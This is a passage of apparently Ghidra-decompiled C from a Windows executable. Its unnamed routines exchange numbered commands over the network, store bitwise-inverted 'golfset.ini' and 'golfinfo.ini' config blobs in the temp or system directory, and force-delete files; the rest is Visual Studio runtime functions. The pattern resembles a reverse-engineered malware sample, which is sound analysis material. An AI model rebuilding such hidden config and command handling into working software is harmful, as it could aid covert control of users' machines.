              pcVar15 = pcVar15 + 1;
            } while (bVar16);
            if (bVar16) {
              bVar11 = local_390[iVar10 + 4];
              bStack_391 = bVar11 >> 1 & 1;
              bStack_392 = bVar11 >> 2 & 1;
              iVar5 = iVar10 + 5;
              if ((bVar11 & 1) != 0) {
                pcVar15 = local_390 + iVar5;
                iVar5 = iVar10 + 9;
                iVar2 = CONCAT21(CONCAT11(local_390[iVar10 + 8],local_390[iVar10 + 7]),
                                 local_390[iVar10 + 6]);
                uVar8 = CONCAT31(iVar2,*pcVar15);
                lVar17 = __allmul(uVar8 + 0xb6109100,
                                  ((int)iVar2 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar8),10000000,0);
                *(longlong *)(param_2 + 0x88) = lVar17;
              }
              iVar10 = iVar5;
              if (bStack_391 != 0) {
                iVar10 = iVar5 + 4;
                iVar2 = CONCAT21(CONCAT11(pcVar6[iVar5 + 3],pcVar6[iVar5 + 2]),pcVar6[iVar5 + 1]);
                uVar8 = CONCAT31(iVar2,pcVar6[iVar5]);
                lVar17 = __allmul(uVar8 + 0xb6109100,
                                  ((int)iVar2 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar8),10000000,0);
                *(longlong *)(param_2 + 0x84) = lVar17;
              }
              if (bStack_392 != 0) {
                iVar2 = CONCAT21(CONCAT11(local_390[iVar10 + 3],local_390[iVar10 + 2]),
                                 local_390[iVar10 + 1]);
                uVar8 = CONCAT31(iVar2,local_390[iVar10]);
                lVar17 = __allmul(uVar8 + 0xb6109100,
                                  ((int)iVar2 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar8),10000000,0);
                *(longlong *)(param_2 + 0x86) = lVar17;
              }
              break;
            }
            iVar10 = iVar10 + 4 + (uint)(byte)local_390[iVar10 + 2];
          } while ((char *)(iVar10 + 4U) < local_380);
        }
        if (local_390 != (char *)0x0) {
          _free(local_390);
        }
        piVar13 = local_384 + 2;
        for (iVar10 = 0x8c; iVar10 != 0; iVar10 = iVar10 + -1) {
          *piVar13 = *param_2;
          param_2 = param_2 + 1;
          piVar13 = piVar13 + 1;
        }
        local_384[0x8e] = param_1;
        goto LAB_0040a02d;
      }
      _free(local_390);
    }
    else if (pcVar15[1] != '\0') {
      SetFilePointer(*(HANDLE *)(pcVar15 + 4),(LONG)(local_390 + *(int *)(pcVar15 + 0xc)),(PLONG)0x0
                     ,0);
      goto LAB_00409c58;
    }
    goto LAB_0040a02d;
  }
                    // WARNING: Load size is inaccurate
  *param_2 = *(int *)(*this + 4);
  *(undefined2 *)(param_2 + 1) = 0;
  param_2[0x83] = 0;
  param_2[0x84] = 0;
  param_2[0x85] = 0;
  param_2[0x86] = 0;
  param_2[0x87] = 0;
  param_2[0x88] = 0;
  param_2[0x89] = 0;
  param_2[0x8a] = 0;
  param_2[0x8b] = 0;
  _Stack_374 = _Var3;
LAB_0040a02d:
  ___security_check_cookie_4(local_8 ^ (uint)auStack_394);
  return;
}



void FUN_0040a050(void *param_1,void *param_2)

{
  int iVar1;
  int iVar2;
  int *unaff_EBX;
  undefined auStack_8 [3];
  char local_5;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)auStack_8;
  if (unaff_EBX[1] != 0) {
    if (unaff_EBX[1] != -1) {
      FUN_00409890();
    }
    unaff_EBX[1] = -1;
    if (*(int *)(*unaff_EBX + 4) < 1) {
      ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
      return;
    }
    if (0 < *(int *)(*unaff_EBX + 0x10)) {
      FUN_004091d0();
    }
    iVar2 = *(int *)(*unaff_EBX + 0x10);
    while (iVar2 < 0) {
      iVar2 = *unaff_EBX;
      if (((iVar2 != 0) && (*(int *)(iVar2 + 0x18) != 0)) &&
         (iVar1 = *(int *)(iVar2 + 0x10) + 1, iVar1 != *(int *)(iVar2 + 4))) {
        *(int *)(iVar2 + 0x14) =
             *(int *)(iVar2 + 0x14) +
             *(int *)(iVar2 + 0x50) + *(int *)(iVar2 + 0x4c) + 0x2e + *(int *)(iVar2 + 0x48);
        *(int *)(iVar2 + 0x10) = iVar1;
        iVar1 = FUN_00408d80((int *)(iVar2 + 0x28),(uint *)(iVar2 + 0x78),(void *)0x0,0);
        *(uint *)(iVar2 + 0x18) = (uint)(iVar1 == 0);
      }
      iVar2 = *(int *)(*unaff_EBX + 0x10);
    }
    FUN_004094a0((char *)unaff_EBX[0x8f]);
    unaff_EBX[1] = 0;
  }
  iVar2 = FUN_00409620(param_2,param_1,&local_5);
  if (iVar2 < 1) {
    FUN_00409890();
    unaff_EBX[1] = -1;
  }
  if (local_5 == '\0') {
    if (iVar2 < 1) {
      ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
      return;
    }
    ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
    return;
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
  return;
}



void FUN_0040a1b0(void)

{
  void **_Memory;
  void *_Memory_00;
  void **unaff_ESI;
  
  if (unaff_ESI[1] != (void *)0xffffffff) {
    FUN_00409890();
  }
  _Memory = (void **)*unaff_ESI;
  unaff_ESI[1] = (void *)0xffffffff;
  if (_Memory != (void **)0x0) {
    if (_Memory[0x1f] != (void *)0x0) {
      FUN_00409890();
    }
    _Memory_00 = *_Memory;
    if (_Memory_00 != (void *)0x0) {
      if (*(char *)((int)_Memory_00 + 0x10) != '\0') {
        CloseHandle(*(HANDLE *)((int)_Memory_00 + 4));
      }
      _free(_Memory_00);
    }
    _free(_Memory);
  }
  *unaff_ESI = (void *)0x0;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * __cdecl FUN_0040a210(undefined4 param_1,undefined4 param_2)

{
  void *pvVar1;
  int iVar2;
  undefined4 *puVar3;
  void *local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_0041ba6b;
  local_c = ExceptionList;
  ExceptionList = &local_c;
  pvVar1 = operator_new(0x44c);
  local_4 = 0;
  if (pvVar1 == (void *)0x0) {
    iVar2 = 0;
  }
  else {
    iVar2 = FUN_00409980();
  }
  local_4 = 0xffffffff;
  _DAT_004253c0 = FUN_004099f0(param_1,param_2);
  if (_DAT_004253c0 != 0) {
    if (iVar2 != 0) {
      FUN_0040a2c0();
    }
    ExceptionList = local_c;
    return (undefined4 *)0x0;
  }
  puVar3 = (undefined4 *)operator_new(8);
  *puVar3 = 1;
  puVar3[1] = iVar2;
  ExceptionList = local_c;
  return puVar3;
}



void FUN_0040a2c0(void)

{
  void *unaff_ESI;
  
  if (*(void **)((int)unaff_ESI + 0x23c) != (void *)0x0) {
    _free(*(void **)((int)unaff_ESI + 0x23c));
  }
  *(undefined4 *)((int)unaff_ESI + 0x23c) = 0;
  if (*(void **)((int)unaff_ESI + 0x240) != (void *)0x0) {
    _free(*(void **)((int)unaff_ESI + 0x240));
  }
  *(undefined4 *)((int)unaff_ESI + 0x240) = 0;
  _free(unaff_ESI);
  return;
}



void __fastcall FUN_0040a310(undefined4 param_1,undefined param_2,undefined4 param_3)

{
  wchar_t *_Src;
  void *_Dst;
  uint uVar1;
  int iVar2;
  ushort uVar3;
  undefined4 *puVar4;
  size_t sVar5;
  undefined4 *puVar6;
  undefined4 local_c18;
  uint local_c14;
  int local_c10;
  size_t local_c0c;
  wchar_t local_c08;
  undefined local_c06 [2046];
  undefined4 local_408 [257];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_c18;
  local_c18 = 0;
  puVar4 = &DAT_004255d0;
  puVar6 = local_408;
  for (iVar2 = 0x80; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar6 = *puVar4;
    puVar4 = puVar4 + 1;
    puVar6 = puVar6 + 1;
  }
  _Dst = _malloc(0x10000);
  _memset(_Dst,0,0x10000);
  local_c0c = 0x10000;
  local_c08 = L'\0';
  _memset(local_c06,0,0x7fe);
  local_c10 = 0;
  local_c14 = 0;
  iVar2 = FUN_004056a0(&local_c08,param_1);
  if (iVar2 == 0) {
    local_c18 = 1;
  }
  else {
    iVar2 = FUN_004058e0((undefined2 *)local_408,&local_c10,0xbb9,0x200,&local_c08);
    if (iVar2 == 0) {
      local_c18 = 3;
    }
    else {
      if (_Dst == (void *)0x0) goto LAB_0040a4eb;
      iVar2 = FUN_00405cc0(_Dst,&local_c10,(undefined2 *)&local_c14,&local_c0c,&local_c08);
      sVar5 = local_c0c;
      if (((iVar2 == 0) || ((short)local_c14 != 0xbb9)) || (local_c0c == 0)) {
        local_c18 = 2;
      }
      else {
        _memset(&DAT_00424788,0,0x578);
        uVar3 = 0;
        local_c14 = 0;
        if (0x117 < (int)sVar5) {
          uVar1 = 0;
          do {
            _Src = (wchar_t *)(uVar1 + (int)_Dst);
            if ((*(short *)(uVar1 + (int)_Dst) != 0) && (uVar3 < 5)) {
              uVar1 = (uint)uVar3;
              _wcscpy_s(&DAT_00424788 + uVar1 * 0x8c,0x7f,_Src);
              _memcpy_s(&DAT_0042488c + uVar1 * 0x118,0x14,_Src + 0x82,0x14);
              (&DAT_00424888)[uVar1 * 0x46] = *(undefined4 *)(_Src + 0x80);
              uVar3 = uVar3 + 1;
              sVar5 = local_c0c;
            }
            local_c14 = local_c14 + 0x118;
            uVar1 = local_c14 & 0xffff;
          } while ((int)(uVar1 + 0x118) <= (int)sVar5);
        }
      }
    }
  }
  if (_Dst != (void *)0x0) {
    _free(_Dst);
  }
LAB_0040a4eb:
  if (local_c10 != 0) {
    Ordinal_3(local_c10);
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_c18);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __thiscall FUN_0040a520(void *this,undefined4 param_1)

{
  short sVar1;
  short *psVar2;
  char *_Dst;
  wchar_t *pwVar3;
  int iVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  FILE *local_102c;
  int local_1028;
  size_t local_1024;
  undefined4 local_1020;
  wchar_t local_101c;
  undefined local_101a [518];
  WCHAR local_e14 [260];
  wchar_t local_c0c;
  undefined4 local_c0a [255];
  wchar_t local_80c;
  undefined local_80a [2050];
  uint local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0x40a52a;
  local_8 = DAT_00422044 ^ (uint)&local_102c;
  local_1020 = param_1;
  _memset(&local_c0c,0,0x400);
  _wcscpy_s(&local_c0c,0x1ff,(wchar_t *)this);
  psVar2 = (short *)this;
  do {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  } while (sVar1 != 0);
  puVar6 = &DAT_004255d0;
  puVar7 = (undefined4 *)((int)local_c0a + ((int)psVar2 - ((int)this + 2) >> 1) * 2);
  for (iVar5 = 0x80; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar7 = *puVar6;
    puVar6 = puVar6 + 1;
    puVar7 = puVar7 + 1;
  }
  iVar5 = (int)this + 2;
  do {
                    // WARNING: Load size is inaccurate
    sVar1 = *this;
    this = (void *)((int)this + 2);
  } while (sVar1 != 0);
  _Dst = (char *)_malloc(0x10000);
  _memset(_Dst,0,0x10000);
  local_1024 = 0x10000;
  local_80c = L'\0';
  _memset(local_80a,0,0x7fe);
  local_1028 = 0;
  local_102c = (FILE *)0x0;
  local_101c = L'\0';
  _memset(local_101a,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,local_e14,0x104);
  pwVar3 = _wcsrchr(local_e14,L'\\');
  *pwVar3 = L'\0';
  _wcscpy_s(&local_101c,0x104,local_e14);
  _wcscat_s(&local_101c,0x103,(wchar_t *)&DAT_0041dc40);
  iVar4 = FUN_004056a0(&local_80c,local_1020);
  if ((((iVar4 != 0) &&
       (iVar5 = FUN_004058e0(&local_c0c,&local_1028,0xbba,((int)this - iVar5 >> 1) * 2 + 0x202,
                             &local_80c), iVar5 != 0)) &&
      (iVar5 = FUN_00405cc0(_Dst,&local_1028,(undefined2 *)&local_102c,&local_1024,&local_80c),
      iVar5 != 0)) && ((((short)local_102c == 0xbba && (local_1024 != 0)) && (*_Dst == '\0')))) {
    _wcscat_s(&local_101c,0x104,(wchar_t *)&DAT_004253c8);
    local_102c = (FILE *)0x0;
    _DAT_00424784 = 0;
    __wfopen_s(&local_102c,&local_101c,(wchar_t *)&DAT_0041dcc4);
    if (local_102c != (FILE *)0x0) {
      FUN_00405e80(&local_102c);
    }
  }
  if (_Dst != (char *)0x0) {
    _free(_Dst);
  }
  if (local_1028 != 0) {
    Ordinal_3(local_1028);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&local_102c);
  return;
}



void FUN_0040a790(void)

{
  short *psVar1;
  short *psVar2;
  void *unaff_EDI;
  FILE *local_214 [2];
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)local_214;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  if (unaff_EDI != (void *)0x0) {
    local_214[0] = (FILE *)0x0;
    psVar1 = &DAT_0041ddcc;
    do {
      psVar2 = psVar1;
      psVar1 = psVar2 + 1;
    } while (*psVar2 != 0);
    if ((int)(psVar2 + -0x20eee6) >> 1 == 0) {
      GetTempPathW(0x104,&local_20c);
      _wcscat_s(&local_20c,0x104,u_golfinfo_ini_0041ff94);
      __wfopen_s(local_214,&local_20c,(wchar_t *)&DAT_0041dcc4);
    }
    else {
      __wfopen_s(local_214,&DAT_0041ddcc,(wchar_t *)&DAT_0041dcc4);
    }
    if (local_214[0] != (FILE *)0x0) {
      _fwrite(unaff_EDI,0x200,1,local_214[0]);
      _fclose(local_214[0]);
    }
    ___security_check_cookie_4(local_4 ^ (uint)local_214);
    return;
  }
  ___security_check_cookie_4(local_4 ^ (uint)local_214);
  return;
}



void FUN_0040a890(void)

{
  wchar_t *pwVar1;
  wchar_t *pwVar2;
  void *unaff_ESI;
  FILE *local_214 [2];
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)local_214;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  local_214[0] = (FILE *)0x0;
  if (unaff_ESI != (void *)0x0) {
    pwVar1 = u_golfset_ini_0041dccc;
    do {
      pwVar2 = pwVar1;
      pwVar1 = pwVar2 + 1;
    } while (*pwVar2 != L'\0');
    if ((int)(pwVar2 + -0x20ee66) >> 1 != 0) {
      if (DAT_004230b0 == 3) {
        GetSystemDirectoryW(&local_20c,0x104);
        _wcscat_s(&local_20c,0x104,(wchar_t *)&DAT_0041dc40);
      }
      else {
        GetTempPathW(0x104,&local_20c);
      }
      _wcscat_s(&local_20c,0x104,u_golfset_ini_0041dccc);
      __wfopen_s(local_214,&local_20c,(wchar_t *)&DAT_0041dcbc);
      if (local_214[0] != (FILE *)0x0) {
        _fread(unaff_ESI,0x200,1,local_214[0]);
        _fclose(local_214[0]);
        ___security_check_cookie_4(local_4 ^ (uint)local_214);
        return;
      }
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)local_214);
  return;
}



void FUN_0040a9b0(void)

{
  wchar_t *pwVar1;
  wchar_t *pwVar2;
  void *unaff_ESI;
  FILE *local_214 [2];
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)local_214;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  local_214[0] = (FILE *)0x0;
  if (unaff_ESI != (void *)0x0) {
    pwVar1 = u_golfinfo_ini_0041ff94;
    do {
      pwVar2 = pwVar1;
      pwVar1 = pwVar2 + 1;
    } while (*pwVar2 != L'\0');
    if ((int)(pwVar2 + -0x20ffca) >> 1 != 0) {
      GetTempPathW(0x104,&local_20c);
      _wcscat_s(&local_20c,0x104,u_golfinfo_ini_0041ff94);
      __wfopen_s(local_214,&local_20c,(wchar_t *)&DAT_0041dcbc);
      if (local_214[0] != (FILE *)0x0) {
        _fread(unaff_ESI,0x200,1,local_214[0]);
        _fclose(local_214[0]);
        ___security_check_cookie_4(local_4 ^ (uint)local_214);
        return;
      }
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)local_214);
  return;
}



void __cdecl FUN_0040aaa0(int param_1)

{
  int iVar1;
  uint uVar2;
  void *unaff_EDI;
  undefined auStack_20c [4];
  int local_208 [129];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)auStack_20c;
  if (unaff_EDI != (void *)0x0) {
    _memset(local_208,0,0x200);
    if (param_1 == 0) {
      iVar1 = FUN_0040a890();
    }
    else {
      iVar1 = FUN_0040a9b0();
    }
    if (iVar1 != 0) {
      uVar2 = 0;
      do {
        *(byte *)((int)local_208 + uVar2) = ~*(byte *)((int)local_208 + uVar2);
        uVar2 = uVar2 + 1;
      } while (uVar2 < 0x200);
      if (local_208[0] == 0x504d534d) {
        _memmove(unaff_EDI,local_208,0x200);
        ___security_check_cookie_4(local_4 ^ (uint)auStack_20c);
        return;
      }
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_20c);
  return;
}



void __cdecl FUN_0040ab60(int *param_1)

{
  uint uVar1;
  undefined auStack_20c [4];
  byte local_208 [516];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)auStack_20c;
  if ((param_1 != (int *)0x0) && (*param_1 == 0x504d534d)) {
    _memmove(local_208,param_1,0x200);
    uVar1 = 0;
    do {
      local_208[uVar1] = ~local_208[uVar1];
      uVar1 = uVar1 + 1;
    } while (uVar1 < 0x200);
    FUN_0040a790();
    ___security_check_cookie_4(local_4 ^ (uint)auStack_20c);
    return;
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_20c);
  return;
}



HANDLE FUN_0040abf0(void)

{
  DWORD DVar1;
  BOOL BVar2;
  HANDLE pvVar3;
  LPCWSTR unaff_ESI;
  
  DVar1 = GetFileAttributesW(unaff_ESI);
  if (DVar1 != 0xffffffff) {
    DVar1 = GetFileAttributesW(unaff_ESI);
    if (DVar1 != 0xffffffff) {
      if ((DVar1 & 1) != 0) {
        DVar1 = DVar1 ^ 1;
      }
      if ((DVar1 & 4) != 0) {
        DVar1 = DVar1 ^ 4;
      }
      if ((DVar1 & 2) != 0) {
        DVar1 = DVar1 ^ 2;
      }
      if ((DVar1 & 0x20) != 0) {
        DVar1 = DVar1 ^ 0x20;
      }
      SetFileAttributesW(unaff_ESI,DVar1);
      BVar2 = DeleteFileW(unaff_ESI);
      GetLastError();
      if (BVar2 != 0) goto LAB_0040ac43;
    }
    return (HANDLE)0xffffffff;
  }
LAB_0040ac43:
  pvVar3 = CreateFileW(unaff_ESI,0x40000000,1,(LPSECURITY_ATTRIBUTES)0x0,2,0,(HANDLE)0x0);
  return pvVar3;
}



void GetAdaptersInfo(void)

{
                    // WARNING: Could not recover jumptable at 0x0040ac5c. Too many branches
                    // WARNING: Treating indirect jump as call
  GetAdaptersInfo();
  return;
}



// Library Function - Single Match
//  @__security_check_cookie@4
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __fastcall ___security_check_cookie_4(int param_1)

{
  if (param_1 == DAT_00422044) {
    return;
  }
                    // WARNING: Subroutine does not return
  ___report_gsfailure();
}



// Library Function - Single Match
//  _wcsrchr
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release

wchar_t * __cdecl _wcsrchr(wchar_t *_Str,wchar_t _Ch)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  
  pwVar2 = _Str;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  do {
    pwVar2 = pwVar2 + -1;
    if (pwVar2 == _Str) break;
  } while (*pwVar2 != _Ch);
  return (wchar_t *)((uint)pwVar2 & ~-(uint)(*pwVar2 != _Ch));
}



// Library Function - Single Match
//  _wcscat_s
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl _wcscat_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        if (*pwVar3 == L'\0') break;
        pwVar3 = pwVar3 + 1;
        _SizeInWords = _SizeInWords - 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        do {
          wVar1 = *_Src;
          *pwVar3 = wVar1;
          pwVar3 = pwVar3 + 1;
          _Src = _Src + 1;
          if (wVar1 == L'\0') break;
          _SizeInWords = _SizeInWords - 1;
        } while (_SizeInWords != 0);
        if (_SizeInWords != 0) {
          return 0;
        }
        *_Dst = L'\0';
        piVar2 = __errno();
        eVar4 = 0x22;
        *piVar2 = 0x22;
        goto LAB_0040acc0;
      }
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0040acc0:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



void __cdecl FUN_0040ad1b(ulong param_1)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  p_Var1->_holdrand = param_1;
  return;
}



// Library Function - Single Match
//  _rand
// 
// Libraries: Visual Studio 2003 Release, Visual Studio 2005 Release, Visual Studio 2008 Release

int __cdecl _rand(void)

{
  _ptiddata p_Var1;
  uint uVar2;
  
  p_Var1 = __getptd();
  uVar2 = p_Var1->_holdrand * 0x343fd + 0x269ec3;
  p_Var1->_holdrand = uVar2;
  return uVar2 >> 0x10 & 0x7fff;
}



// Library Function - Single Match
//  _wcscpy_s
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl _wcscpy_s(wchar_t *_Dst,rsize_t _SizeInWords,wchar_t *_Src)

{
  wchar_t wVar1;
  int *piVar2;
  wchar_t *pwVar3;
  errno_t eVar4;
  
  if ((_Dst != (wchar_t *)0x0) && (_SizeInWords != 0)) {
    pwVar3 = _Dst;
    if (_Src != (wchar_t *)0x0) {
      do {
        wVar1 = *_Src;
        *pwVar3 = wVar1;
        _Src = _Src + 1;
        if (wVar1 == L'\0') break;
        _SizeInWords = _SizeInWords - 1;
        pwVar3 = pwVar3 + 1;
      } while (_SizeInWords != 0);
      if (_SizeInWords != 0) {
        return 0;
      }
      *_Dst = L'\0';
      piVar2 = __errno();
      eVar4 = 0x22;
      *piVar2 = 0x22;
      goto LAB_0040ad69;
    }
    *_Dst = L'\0';
  }
  piVar2 = __errno();
  eVar4 = 0x16;
  *piVar2 = 0x16;
LAB_0040ad69:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar4;
}



// Library Function - Single Match
//  _wcsstr
// 
// Library: Visual Studio 2005 Release

wchar_t * __cdecl _wcsstr(wchar_t *_Str,wchar_t *_SubStr)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  int iVar3;
  
  if (*_SubStr != L'\0') {
    wVar1 = *_Str;
    if (wVar1 != L'\0') {
      iVar3 = (int)_Str - (int)_SubStr;
      pwVar2 = _SubStr;
joined_r0x0040addc:
      do {
        if (wVar1 != L'\0') {
          if (*pwVar2 == L'\0') {
            return _Str;
          }
          if (*(wchar_t *)(iVar3 + (int)pwVar2) == *pwVar2) {
            wVar1 = *(wchar_t *)(iVar3 + (int)(pwVar2 + 1));
            pwVar2 = pwVar2 + 1;
            goto joined_r0x0040addc;
          }
        }
        if (*pwVar2 == L'\0') {
          return _Str;
        }
        _Str = _Str + 1;
        wVar1 = *_Str;
        iVar3 = iVar3 + 2;
        pwVar2 = _SubStr;
      } while (wVar1 != L'\0');
    }
    _Str = (wchar_t *)0x0;
  }
  return _Str;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wfsopen
// 
// Library: Visual Studio 2005 Release

FILE * __cdecl __wfsopen(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00420260;
  uStack_c = 0x40ae21;
  if (((_Filename == (wchar_t *)0x0) || (_Mode == (wchar_t *)0x0)) || (*_Mode == L'\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != L'\0') {
        pFVar2 = __wopenfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_0040aed1();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_00422044,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_0040aed1(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __wfopen
// 
// Library: Visual Studio 2005 Release

FILE * __cdecl __wfopen(wchar_t *_Filename,wchar_t *_Mode)

{
  FILE *pFVar1;
  
  pFVar1 = __wfsopen(_Filename,_Mode,0x40);
  return pFVar1;
}



// Library Function - Single Match
//  __wfopen_s
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl __wfopen_s(FILE **_File,wchar_t *_Filename,wchar_t *_Mode)

{
  int *piVar1;
  FILE *pFVar2;
  int iVar3;
  
  if (_File == (FILE **)0x0) {
    piVar1 = __errno();
    iVar3 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    pFVar2 = __wfsopen(_Filename,_Mode,0x80);
    *_File = pFVar2;
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      iVar3 = *piVar1;
    }
    else {
      iVar3 = 0;
    }
  }
  return iVar3;
}



// Library Function - Single Match
//  __fseek_nolock
// 
// Library: Visual Studio 2005 Release

int __cdecl __fseek_nolock(FILE *_File,long _Offset,int _Origin)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  long lVar4;
  
  if ((_File->_flag & 0x83U) == 0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    iVar3 = -1;
  }
  else {
    _File->_flag = _File->_flag & 0xffffffef;
    if (_Origin == 1) {
      lVar4 = __ftell_nolock(_File);
      _Offset = _Offset + lVar4;
      _Origin = 0;
    }
    __flush(_File);
    uVar1 = _File->_flag;
    if ((char)uVar1 < '\0') {
      _File->_flag = uVar1 & 0xfffffffc;
    }
    else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {
      _File->_bufsiz = 0x200;
    }
    iVar3 = __fileno(_File);
    lVar4 = __lseek(iVar3,_Offset,_Origin);
    iVar3 = (lVar4 != -1) - 1;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fseek
// 
// Library: Visual Studio 2005 Release

int __cdecl _fseek(FILE *_File,long _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  
  if ((_File == (FILE *)0x0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __fseek_nolock(_File,_Offset,_Origin);
    FUN_0040b040();
  }
  return iVar2;
}



void FUN_0040b040(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __ftell_nolock
// 
// Library: Visual Studio 2005 Release

long __cdecl __ftell_nolock(FILE *_File)

{
  uint uVar1;
  char *pcVar2;
  int *piVar3;
  uint _FileHandle;
  FILE *pFVar4;
  long lVar5;
  char *pcVar6;
  FILE *pFVar7;
  char *pcVar8;
  int iVar9;
  bool bVar10;
  int local_10;
  int local_c;
  
  pFVar7 = _File;
  if (_File == (FILE *)0x0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  _FileHandle = __fileno(_File);
  if (_File->_cnt < 0) {
    _File->_cnt = 0;
  }
  local_c = __lseek(_FileHandle,0,1);
  if (local_c < 0) {
    return -1;
  }
  uVar1 = _File->_flag;
  if ((uVar1 & 0x108) == 0) {
    return local_c - _File->_cnt;
  }
  pcVar6 = _File->_ptr;
  pcVar8 = _File->_base;
  local_10 = (int)pcVar6 - (int)pcVar8;
  if ((uVar1 & 3) == 0) {
    if (-1 < (char)uVar1) {
      piVar3 = __errno();
      *piVar3 = 0x16;
      return -1;
    }
  }
  else {
    pcVar2 = pcVar8;
    if ((*(byte *)((&DAT_00425820)[(int)_FileHandle >> 5] + 4 + (_FileHandle & 0x1f) * 0x28) & 0x80)
        != 0) {
      for (; pcVar2 < pcVar6; pcVar2 = pcVar2 + 1) {
        if (*pcVar2 == '\n') {
          local_10 = local_10 + 1;
        }
      }
    }
  }
  if (local_c != 0) {
    if ((*(byte *)&_File->_flag & 1) != 0) {
      if (_File->_cnt == 0) {
        local_10 = 0;
      }
      else {
        iVar9 = (_FileHandle & 0x1f) * 0x28;
        pFVar4 = (FILE *)(pcVar6 + (_File->_cnt - (int)pcVar8));
